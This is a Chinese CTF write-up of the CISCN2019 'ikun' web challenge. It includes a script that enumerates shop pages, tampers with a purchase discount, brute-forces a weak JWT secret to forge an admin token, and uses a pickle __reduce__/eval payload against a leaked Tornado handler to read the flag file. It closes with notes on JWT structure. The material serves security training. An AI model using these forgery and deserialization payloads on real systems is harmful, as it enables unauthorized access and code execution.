---
title: CISCN2019 华北赛区 Day1 Web2 ikun
date: 2024-05-30 16:18:51 
tags: 
      - pickle
      - jwt
categories: 刷题笔记
---

## [CISCN2019 华北赛区 Day1 Web2]ikun（jwt和pickle）

首先先注册账号，登录

我们在首页发现提示信息，需要我们买到lv6

<!-- more -->

![image-20240530161942174](https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202405301619241.png)

但是首页没发现有lv6，我们往下翻，发现url变了

```
http://8ead91f4-274d-4f40-8ad2-225f8f8b1ef8.node5.buuoj.cn:81/shop?page=2
```

page变成了2，由此我们可以依据这个写个脚本来查询lv6

```
import requests
#encoding:utf-8
import base64

s = requests.session()
url = "http://5023acc3-5e1b-4d05-82a9-ff5da9c8686c.node5.buuoj.cn:81/shop?page="

for i in range(1,500):
    url2 = url + str(i)
    ra = s.get(url = url2)
    if "lv6.png" in ra.text:
        print(i)
```

查询到lv6在181页

![image-20240530162503734](https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202405301625823.png)

查到了后，但是太贵了，我们买不起，这个时候就需要抓包修改优惠了

![image-20240530162601500](https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202405301626582.png)

买好后它说只允许admin查看

![image-20240530162702576](https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202405301627621.png)

我们观察到http请求中出现jwt数据，我们将它解码

https://jwt.io/

![image-20240530162903819](https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202405301629874.png)

我们可以发现用户名是我们注册的，如果我们将用户名修改为admin，同时生成jwt数据，就能绕过，但我们需要知道密钥

这里用到工具c-jwt-cracker暴力破解

![image-20240530163204999](https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202405301632020.png)

得到密钥‘1Kun’，我们修改数据，得到新生成的jwt数据

![image-20240530163252900](https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202405301632059.png)

我们将伪造好的JWT替换原来的JWT就能一键成为大会员了

![image-20240530163426041](C:/Users/11/AppData/Roaming/Typora/typora-user-images/image-20240530163426041.png)

我们查看页面源码，发现有源码泄露

![image-20240530163559883](https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202405301635918.png)

打开`www\sshop\views\admin.py`

```
import tornado.web
from sshop.base import BaseHandler
import pickle
import urllib


class AdminHandler(BaseHandler):
    @tornado.web.authenticated
    def get(self, *args, **kwargs):
        if self.current_user == "admin":
            return self.render('form.html', res='This is Black Technology!', member=0)
        else:
            return self.render('no_ass.html')

    @tornado.web.authenticated
    def post(self, *args, **kwargs):
        try:
            become = self.get_argument('become')
            p = pickle.loads(urllib.unquote(become))
            return self.render('form.html', res=p, member=1)
        except:
            return self.render('form.html', res='This is Black Technology!', member=0)

```

我们发现是pickle反序列化

这里可以利用的地方是

```
 become = self.get_argument('become')
            p = pickle.loads(urllib.unquote(become))
            return self.render('form.html', res=p, member=1)
```

服务端会对我们传入的become参数进行操作，并且用到pickle这个东西，我们可以利用其进行文件读取，并将flag传回form.html中。
这里摘录下大佬的文章，[Python魔法方法指南](https://pyzh.readthedocs.io/en/latest/python-magic-methods-guide.html)
同时还有关于pickle和reduce实例用法的链接：[在pickle模块的情况下，reduce函数是如何工作的？](https://www.cnpython.com/qa/210937)
![在这里插入图片描述](https://img-blog.csdnimg.cn/791544115aba4b108466e2c96fd25080.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L1JBQkNEWEI=,size_16,color_FFFFFF,t_70)

我们运行脚本生成payload

```
import pickle
import urllib.parse
class payload(object):
    def __reduce__(self):
       return (eval, ("open('/flag.txt').read()",))
a = pickle.dumps(payload(),protocol=0)  #python3的写法， 使用协议0进行序列化
print(urllib.parse.quote(a))

```

抓包修改become得到flag

![image-20240530164452022](https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202405301644113.png)



## 知识点

### jwt

 [认识JWT](https://www.cnblogs.com/cjsblog/p/9277677.html)

[JWT伪造工具](https://jwt.io/)

#### 1. JSON Web Token是什么

JSON Web Token (JWT)是一个开放标准(RFC 7519)，它定义了一种紧凑的、自包含的方式，用于作为JSON对象在各方之间安全地传输信息。该信息可以被验证和信任，因为它是数字签名的。

#### 2. 什么时候你应该用JSON Web Tokens

下列场景中使用JSON Web Token是很有用的：

- **Authorization** (授权) : 这是使用JWT的最常见场景。一旦用户登录，后续每个请求都将包含JWT，允许用户访问该令牌允许的路由、服务和资源。单点登录是现在广泛使用的JWT的一个特性，因为它的开销很小，并且可以轻松地跨域使用。
- **Information Exchange** (信息交换) : 对于安全的在各方之间传输信息而言，JSON Web Tokens无疑是一种很好的方式。因为JWTs可以被签名，例如，用公钥/私钥对，你可以确定发送人就是它们所说的那个人。另外，由于签名是使用头和有效负载计算的，您还可以验证内容没有被篡改。

#### 3. JSON Web Token的结构是什么样的

![img](https://images2018.cnblogs.com/blog/874963/201807/874963-20180709124807031-664967381.png)

JSON Web Token由三部分组成，它们之间用圆点(.)连接。这三部分分别是：

- Header
- Payload
- Signature

因此，一个典型的JWT看起来是这个样子的：

xxxxx.yyyyy.zzzzz

接下来，具体看一下每一部分：

#### Header

header典型的由两部分组成：token的类型（“JWT”）和算法名称（比如：HMAC SHA256或者RSA等等）。

例如：

![img](https://images2018.cnblogs.com/blog/874963/201807/874963-20180707143936465-1142974441.png)

然后，用Base64对这个JSON编码就得到JWT的第一部分

 

#### Payload

JWT的第二部分是payload，它包含声明（要求）。声明是关于实体(通常是用户)和其他数据的声明。声明有三种类型: registered, public 和 private。

- Registered claims : 这里有一组预定义的声明，它们不是强制的，但是推荐。比如：iss (issuer), exp (expiration time), sub (subject), aud (audience)等。
- Public claims : 可以随意定义。
- Private claims : 用于在同意使用它们的各方之间共享信息，并且不是注册的或公开的声明。

下面是一个例子：

![img](https://images2018.cnblogs.com/blog/874963/201807/874963-20180707144153274-292205768.png)

对payload进行Base64编码就得到JWT的第二部分

注意，不要在JWT的payload或header中放置敏感信息，除非它们是加密的。



#### Signature

为了得到签名部分，你必须有编码过的header、编码过的payload、一个秘钥，签名算法是header中指定的那个，然对它们签名即可。

例如：

HMACSHA256(base64UrlEncode(header) + "." + base64UrlEncode(payload), secret)

签名是用于验证消息在传递过程中有没有被更改，并且，对于使用私钥签名的token，它还可以验证JWT的发送方是否为它所称的发送方。

看一张官网的图就明白了：

![img](https://images2018.cnblogs.com/blog/874963/201807/874963-20180707150229764-2037235703.png)



### pickle

[在pickle模块的情况下，reduce函数是如何工作的？](https://www.cnpython.com/qa/210937)

[Python pickle 反序列化小总结](https://xz.aliyun.com/t/11807?time__1311=mqmx0DBD90qWqGNqeeqBILrODun6te4D&alichlgref=https%3A%2F%2Fwww.google.com%2F)
